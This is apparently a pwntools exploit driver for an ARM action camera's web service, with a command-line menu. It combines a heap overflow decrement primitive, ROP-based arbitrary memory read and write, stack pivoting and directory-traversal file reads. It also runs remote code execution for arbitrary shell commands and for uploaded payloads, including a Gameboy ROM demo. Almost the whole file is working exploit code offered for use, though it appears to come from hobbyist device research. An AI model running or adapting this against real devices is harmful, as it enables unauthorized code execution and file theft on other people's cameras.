import requests
import socket
import os
import threading
from pwn import *
import json
import argparse

from vii_http import *
from util import *
from heap_overflow import *
from shellcode import *

# Set the context for 32-bit ARM little-endian
context.arch = 'arm'
context.bits = 32
context.endian = 'little'

# in this version of the memory write, we reuse the fifth slot
# and keep the other decrement connections alive so they do not
# get freed, this seems to be pretty inconsistent, so I am going
# to see if I can 'groom' the connections such that the one we 
# hit is always the very first one - I think the way to do it
# is:
# - init the first decrement with a smaller timeout than the other
# three
# - make the requests for the other decrements have a larger timeout
# - the first decrement should be freed up first, so we can just keep
#   the other connections alive until we populate the stack, then make
#   the request
def memory_write(address, value):
    # set the address and value param globals our rop chain uses
    set_param('language', value)
    set_param('encodec', address)

    # now do the decrement to modify the index callback
    threads = []
    for i in range(4): 
        thread = threading.Thread(target=heap_overflow_arb_decrement_primitive, args=(0xc09afeb8, 0.5))
        threads.append(thread)
        thread.start()
        time.sleep(0.05)

    # set the contents of the stack to be the rop chain
    do_index_html_req_rop_memory_write(b"CHEESE")

    time.sleep(0.1)

    # do actual request to trigger modified callback and execute rop chain
    do_index_html_req(b"GET")

    time.sleep(0.6)

# this memory write uses the first connection (which is generally more predictable) however still crashes :(
def memory_write_safe(address, value):
    # set the address and value param globals our rop chain uses
    set_param('language', value)
    set_param('encodec', address)

    time.sleep(.1)

    threads = []

    # first we initialise a get /mnt/pwned connection with a large timeout (essentially reserving it)
    thread = threading.Thread(target=http_get_file_request, args=(0.5,))
    thread.start()
    time.sleep(0.1)

    # now do the decrement to modify the index callback with a longer timeout than the above request
    for i in range(4): 
        thread = threading.Thread(target=heap_overflow_arb_decrement_primitive, args=(0xc09afeb8, 1.5))
        threads.append(thread)
        thread.start()
        time.sleep(0.05)

    # wait for holding file request to time out
    time.sleep(.5)

    # set the contents of the stack to be the rop chain
    do_index_html_req_rop_memory_write_safe(b"CHEESE")

    time.sleep(.2)

    # do actual request to trigger modified callback and execute rop chain
    do_index_html_req(b"GET")

    time.sleep(.5)

# this uses global param values to read memory
def memory_read(address):
    # we will use the encodec as the address, and language will contain the response
    set_param('encodec', address - 0x4)

    # now do the decrement to modify the index callback
    threads = []
    for i in range(4): 
        thread = threading.Thread(target=heap_overflow_arb_decrement_primitive, args=(0xc09afeb8, 0.5))
        threads.append(thread)
        thread.start()
        time.sleep(0.05)

    # set the contents of the stack to be the rop chain
    do_index_html_req_rop_memory_read(b"CHEESE")

    time.sleep(0.05)

    # do actual request to trigger modified callback and execute rop chain
    do_index_html_req(b"GET")

    time.sleep(0.5)

    response = get_param('encodec')
    pretty_print_json_response(response)

    # Decode the byte string to a regular string
    response_str = response.decode('utf-8')

    # Parse the JSON string
    data = json.loads(response_str)

    # Extract the 'value' from the nested 'info' object
    signed_value = data['info']['value']

    # Convert the signed integer to its 32-bit equivalent
    # If the signed_value is negative, convert it to 2's complement (32-bit signed integer)
    if signed_value < 0:
        hex_value = hex((1 << 32) + signed_value)
    else:
        hex_value = hex(signed_value)

    # Print the result
    success(f"Recovered value: {hex_value}")

# sends payload to opened socket (for second shellcode)
def send_app_to_socket(server_ip, port, filename):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, port))
        with open(filename, 'rb') as f:
            while (data := f.read(1024)):
                s.sendall(data)

# the full method to get arbitrary code execution with the heap overflow
def remote_code_execution(payload, command=''):
    # construct and upload our stage 3
    if payload == 'cpuid':
        payload_length = create_print_cpu_id_aac_code_exec_payload()
    elif payload == 'cmd':
        payload_length = run_shell_command_aac_code_exec_payload(command)
    elif payload == 'test':
        payload_length = compiled_code_exec_payload("payload.bin")
    else:
        info("INVALID PAYLOAD")
        return

    upload_file_to_sd("test.aac", "test.aac")

    # decrement the index.html callback by 4
    threads = []
    for i in range(4): 
        thread = threading.Thread(target=heap_overflow_arb_decrement_primitive, args=(0xc09afeb8, 1))
        threads.append(thread)
        thread.start()
        time.sleep(0.1)

    time.sleep(0.1)

    # groom the stack with our pivot-to-stage-2 ROP chain
    do_index_html_req_rop_stack_pivot_to_stage_2_rop_chain(b"HACKZZ")

    time.sleep(0.1)

    # the first request will fix up state, and pivot the stack to the main recv buffer for the current request (more room + less limited)
    do_index_html_req_for_code_exec(b"GET", payload_length)

    # join threads
    for thread in threads:
        thread.join()

    success("DONE!")

# the full method to get arbitrary code execution with the heap overflow (but code is run in a new thread)
def remote_code_execution_thread(payload, game_name=''):
    # construct and upload our stage 3
    if payload == 'cpuid':
        payload_length = create_print_cpu_id_aac_code_exec_payload_thread()
    elif payload == 'gameboy':
        payload_length = compiled_code_exec_payload("payload.bin")
    else:
        info("INVALID PAYLOAD")
        return

    upload_file_to_sd("test.aac", "test.aac")

    # decrement the index.html callback by 4
    threads = []
    for i in range(4): 
        thread = threading.Thread(target=heap_overflow_arb_decrement_primitive, args=(0xc09afeb8, 1))
        threads.append(thread)
        thread.start()
        time.sleep(0.1)

    time.sleep(0.1)

    # groom the stack with our pivot-to-stage-2 ROP chain
    do_index_html_req_rop_stack_pivot_to_stage_2_rop_chain(b"HACKZZ")

    time.sleep(0.1)

    # the first request will fix up state, and pivot the stack to the main recv buffer for the current request (more room + less limited)
    do_index_html_req_for_code_exec_spin_up_thread(b"GET", payload_length)

    # join threads
    for thread in threads:
        thread.join()

    # send the app we use to run the gameboy game
    app_port = 4321
    game_port = 1234
    if payload == 'gameboy':
        success(f"Execution stage done, now sending gameboy.app on port {app_port}")

        send_app_to_socket("192.168.169.1", app_port, "gameboy.app")

        info("Sleeping while file is processed...")
        time.sleep(10)

        success(f"Gameboy app sent, now sending {game_name} game on port {game_port}")

        send_app_to_socket("192.168.169.1", game_port, game_name)

    success(f"DONE!")

def main():
    print_ascii_art()

    # define main parser
    parser = argparse.ArgumentParser(prog='python3 action_cam_hacking.py')

    subparsers = parser.add_subparsers(dest='command', help='Available functions')

    parser.add_argument("-camera_ip",
                    type=str,
                    required=False,
                    help="IP of the action camera",
                    default="192.168.169.1")

    # define parser for enable_telnet command
    get_media_info_parser = subparsers.add_parser('get_media_info', 
                    help='Fetch RTSP information')
    get_device_attr_parser = subparsers.add_parser('get_device_attr',
                    help = 'Get device attribute')
    get_sd_info_parser = subparsers.add_parser('get_sd_info',
                    help = 'Get SD card information')
    get_product_info_parser = subparsers.add_parser('get_product_info',
                    help = 'Get product information')    
    get_battery_info_parser = subparsers.add_parser('get_battery_info',
                    help = 'Get battery information')           
    get_rec_duration_parser = subparsers.add_parser('get_rec_duration',
                    help = 'Get current length of recording')

    get_param_parser = subparsers.add_parser('get_param',
                    help = 'Fetch a device parameter (mic, osd, logo_osd, video_flip, encodec, rec_split_duration, rec, language)')   
    get_param_parser.add_argument("name",
                    type=str,
                    help="name of param to fetch")

    arb_code_exec_thread_parser = subparsers.add_parser('set_param',
                    help = 'Set a device param to integer value (mic, osd, logo_osd, video_flip, encodec, rec_split_duration, rec, language)')   
    arb_code_exec_thread_parser.add_argument("name",
                    type=str,
                    help="name of param to set")
    arb_code_exec_thread_parser.add_argument("value",
                    type=int,
                    help="value to set param")

    file_read_parser = subparsers.add_parser('file_read',
                    help = 'Arbitrary file read using directory traversal')
    file_read_parser.add_argument("path_on_device",
                    type=str,
                    help="file path you want to read on the device")

    file_write_on_sd_parser = subparsers.add_parser('file_write_on_sd',
                    help = 'File write on SD card')
    file_write_on_sd_parser.add_argument("filename",
                    type=str,
                    help="file you want to upload")

    arb_read_parser = subparsers.add_parser('arb_read',
                    help = 'Arbitrary read using heap overflow + ROP')
    arb_read_parser.add_argument("address",
                    type=str,
                    help="address you want to read (in hexadecimal)")

    arb_write_parser = subparsers.add_parser('arb_write',
                    help = 'Arbitrary write using heap overflow + ROP')
    arb_write_parser.add_argument("address",
                    type=str,
                    help="address you want to write (in hexadecimal)")
    arb_write_parser.add_argument("value",
                    type=str,
                    help="value you want to write (in hexadecimal)")

    arb_write_safe_parser = subparsers.add_parser('arb_write_safe',
                    help = 'Arbitrary write using heap overflow + ROP (but using first client slot instead of fifth)')
    arb_write_safe_parser.add_argument("address",
                    type=str,
                    help="address you want to write (in hexadecimal)")
    arb_write_safe_parser.add_argument("value",
                    type=str,
                    help="value you want to write (in hexadecimal)")

    arb_code_exec_parser = subparsers.add_parser('arb_code_exec',
                    help = 'Execute arbitrary code payload in test.aac')   

    arb_code_exec_subparsers = arb_code_exec_parser.add_subparsers(dest="sub_command", help="Code exec sub-commands")

    cpu_id_parser = arb_code_exec_subparsers.add_parser('cpuid', help='Print the CPU ID on the UART')

    cmd_parser = arb_code_exec_subparsers.add_parser('cmd', help="Execute a single command string")
    cmd_parser.add_argument("command_str", type=str, help="Command to execute")
        

    arb_code_exec_thread_parser = subparsers.add_parser('arb_code_exec_thread',
                    help = 'Execute arbitrary code payload in test.aac inside its own thread')   

    arb_code_exec_thread_subparsers = arb_code_exec_thread_parser.add_subparsers(dest="sub_command", help="Thread code exec sub-commands")

    cpu_id_parser = arb_code_exec_thread_subparsers.add_parser('cpuid', help='Print the CPU ID on the UART')

    gameboy_parser = arb_code_exec_thread_subparsers.add_parser('gameboy', help="Run a gameboy game remotely on the action camera")
    gameboy_parser.add_argument("game_name", type=str, help="Filename of the ROM to execute")
        
    # run once arguments parsed
    arguments = parser.parse_args()

    # handle selected method
    if (arguments.command == 'get_product_info'):
        get_product_info()
    elif (arguments.command == 'get_media_info'):
        get_media_info()
    elif (arguments.command == 'get_device_attr'):
        get_device_attr()
    elif (arguments.command == 'get_sd_info'):
        get_sd_info()
    elif (arguments.command == 'get_battery_info'):
        get_battery_info()
    elif (arguments.command == 'get_rec_duration'):
        get_rec_duration()
    elif (arguments.command == 'get_param'):
        json_bytes = get_param(arguments.name)

        # Parse the JSON string (from bytes) back to a dictionary
        parsed_response = json.loads(json_bytes.decode('utf-8'))
        value = parsed_response["info"]["value"]
        info(f"Value of {arguments.name}: {hex(value)}")
    elif (arguments.command == 'set_param'):
        set_param(arguments.name, arguments.value)
    elif (arguments.command == 'file_write_on_sd'):
        upload_file_to_sd(arguments.filename)
    elif (arguments.command == 'file_read'):
        read_thumbnail_arb_read(arguments.path_on_device, arguments.path_on_device.split('/')[-1])
    elif (arguments.command == 'arb_write'):
        memory_write(hex_to_int(arguments.address), hex_to_int(arguments.value))
    elif (arguments.command == 'arb_write_safe'):
        memory_write_safe(hex_to_int(arguments.address), hex_to_int(arguments.value))
    elif (arguments.command == 'arb_read'):       
        memory_read(hex_to_int(arguments.address))
    elif (arguments.command == 'arb_code_exec'):
        if arguments.sub_command == "cmd":
            remote_code_execution(arguments.sub_command, arguments.command_str)
        else:
            remote_code_execution(arguments.sub_command)
    elif (arguments.command == 'arb_code_exec_thread'):
        if arguments.sub_command == "gameboy":
            remote_code_execution_thread(arguments.sub_command, arguments.game_name)
        else:
            remote_code_execution_thread(arguments.sub_command)

if __name__ == "__main__":
    main()

